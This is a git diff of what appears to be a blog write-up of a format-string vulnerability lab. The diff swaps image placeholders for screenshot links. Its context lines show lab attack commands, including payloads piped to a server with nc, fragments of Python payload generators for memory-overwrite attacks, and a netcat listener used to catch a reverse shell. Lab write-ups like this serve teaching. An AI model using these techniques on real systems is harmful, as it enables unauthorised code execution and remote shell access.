@@ -143,7 +143,8 @@ So we first send a benign message to the server to get these values.
 echo hello | nc -w5 10.9.0.5 9090
 ```
 
-**image**
+![task-1-a](https://github.com/iukadike/blog/assets/58455326/53b9aa05-b681-4c0c-bb06-baad0813ea09)
+
 
 When a program uses a format string, the function using the format string takes its values from the stack.
 
@@ -167,7 +168,8 @@ To crash the program, we need to introduce format specifiers so the program will
 echo %s | nc -w5 10.9.0.5 9090
 ```
 
-**image**
+![task-1-b](https://github.com/iukadike/blog/assets/58455326/f10426bc-b091-44b4-b10b-f1b6912b7e89)
+
 
 We can tell that the format program has crashed because it did not print out "Returned properly" and a few smiley faces.
 
@@ -209,7 +211,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-2-a](https://github.com/iukadike/blog/assets/58455326/91b01fc5-faeb-43e6-88de-2eb0701e58da)
+
 
 After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to print out the first four bytes of my input.
 
@@ -247,7 +250,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-2-b](https://github.com/iukadike/blog/assets/58455326/1349d122-2a47-4d5d-b88f-bc1abeb29914)
+
 
 
 <br>
@@ -291,7 +295,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-3-a](https://github.com/iukadike/blog/assets/58455326/4979740e-f043-412b-89d7-a0e612b73122)
+
 
 #### Changing the value to 0x5000.
 
@@ -341,7 +346,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-3-b](https://github.com/iukadike/blog/assets/58455326/ad7456ff-68ba-446d-95a7-14d83bd10c22)
+
 
 #### Changing the value to 0xAABBCCDD.
 
@@ -409,7 +415,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-3-c](https://github.com/iukadike/blog/assets/58455326/3d8147cb-6ef1-44b3-a97f-dfcbde131116)
+
 
 ___
 
@@ -443,7 +450,8 @@ with open('badfile', 'wb') as f:
 
 As we can see, the result is the same.
 
-**image**
+![task-3-d](https://github.com/iukadike/blog/assets/58455326/84ea0a05-b6d1-4c0d-9938-e5175b22c50f)
+
 
 
 ##### Using %hhn
@@ -545,7 +553,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-3-e](https://github.com/iukadike/blog/assets/58455326/2eff533a-f05c-4706-a091-5d3b7e703def)
+
 
 
 <br>
@@ -572,7 +581,8 @@ When we build our attack string, it will consist of the following:
   - the input buffer's address + (a value yet to be determined)
 - the malicious code
 
-**image**
+![task-4-a](https://github.com/iukadike/blog/assets/58455326/c0568d33-84ce-4e2d-bd91-d5fde2c31af6)
+
 
 ```python
 #!/usr/bin/python3
@@ -645,12 +655,13 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-**image**
-
 ```bash
 python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
+
+![task-4-b](https://github.com/iukadike/blog/assets/58455326/6188e926-7bab-4897-a1ff-4699426829fc)
+
 
 <details>
 <summary>Code explanation</summary>
@@ -730,12 +741,14 @@ nc -nvl 9090
 ```
 
 then run the attack.
+
 ```bash
 python3 badfile.py
 cat badfile | nc -w2 10.9.0.5 9090
 ```
 
-**image**
+![task-4-c](https://github.com/iukadike/blog/assets/58455326/76c5f430-e5b1-4e6d-9c75-7f5ddb46a5c6)
+
 
 
 <br>
@@ -775,7 +788,8 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-**image**
+![task-5-a](https://github.com/iukadike/blog/assets/58455326/e91c19e1-379a-4a7d-a5ad-5505f12c2440)
+
 
 After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 34. Thus, it will take 34 %x to print out the first eight bytes of my input.
 
@@ -809,7 +823,8 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-**image**
+![task-5-b](https://github.com/iukadike/blog/assets/58455326/e80bb554-beb2-49a9-a782-a6ae83363a4b)
+
 
 
 #### Modifying the Target Value to 0xAAAABBBBCCCCDDDD
@@ -876,7 +891,8 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-**image**
+![task-5-c](https://github.com/iukadike/blog/assets/58455326/1a87aa2a-b4e8-4baf-949f-b7f5a822f19b)
+
 
 
 #### Inject Malicious Code into the Server Program (A reverse shell)
@@ -898,7 +914,8 @@ When we build our attack string, it will consist of the following:
 - the memory address of our malicious code = the input buffer's address + (a value yet to be determined)
 - the malicious code
 
-**image**
+![task-5-d](https://github.com/iukadike/blog/assets/58455326/06217c07-3ebf-42be-bcd5-88e97ebefbcd)
+
 
 The code we will use to attack the server is as follows:
 
@@ -990,7 +1007,8 @@ python3 badfile.py
 cat badfile | nc -w2 10.9.0.6 9090
 ```
 
-**image**
+![task-5-e](https://github.com/iukadike/blog/assets/58455326/ca5e6872-a435-49de-9a60-1c968137a1f6)
+
 
 <details>
 <summary>Code explanation</summary>
@@ -1078,9 +1096,11 @@ To fix this warning and, in turn, the vulnerability, I would add a string litera
 
 After making the adjustment, the gcc compiler warning message disappears. All that's left is to relaunch the attacks to find out if they will fail or succeed.
 
-**image**
+![task-6-a](https://github.com/iukadike/blog/assets/58455326/2e6c4486-3ba3-4c10-a0b6-b118375c2cb3)
 
-**image**
+
+![task-6-b](https://github.com/iukadike/blog/assets/58455326/e83b7846-f5c8-4e19-8bc5-2dbca18d3392)
+
 
 The attacks all fail.
 
